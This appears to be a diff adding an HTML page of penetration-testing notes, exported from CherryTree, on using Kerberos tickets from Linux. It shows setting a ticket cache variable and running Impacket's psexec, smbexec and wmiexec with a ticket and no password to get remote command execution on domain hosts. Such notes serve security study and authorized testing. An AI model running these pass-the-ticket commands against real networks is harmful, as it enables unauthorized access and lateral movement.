@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>from Linux</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Using Kerberos Tickets - from Linux</h1></strong><br /><br /><strong><h2>## Impacket</h2></strong><br />There are impacket scripts available to use kerberos tickets from a Linux machine.<br /><div class="codebox"><div class="codebox">#&nbsp;Set&nbsp;the&nbsp;ticket&nbsp;for&nbsp;impacket&nbsp;use<br />export&nbsp;KRB5CCNAME=&lt;TGS_ccache_file&gt;<br /><br />#&nbsp;Can&nbsp;now&nbsp;use&nbsp;-k&nbsp;with&nbsp;any&nbsp;impacket&nbsp;script&nbsp;to&nbsp;use&nbsp;the&nbsp;kerberos&nbsp;ticket&nbsp;(providing&nbsp;your&nbsp;ticket&nbsp;gives&nbsp;you&nbsp;access&nbsp;to&nbsp;that&nbsp;service)<br />python&nbsp;psexec.py&nbsp;&lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt;&nbsp;-k&nbsp;-no-pass<br />python&nbsp;smbexec.py&nbsp;&lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt;&nbsp;-k&nbsp;-no-pass<br />python&nbsp;wmiexec.py&nbsp;&lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt;&nbsp;-k&nbsp;-no-pass</div></div></div>
+</body>
+</html>
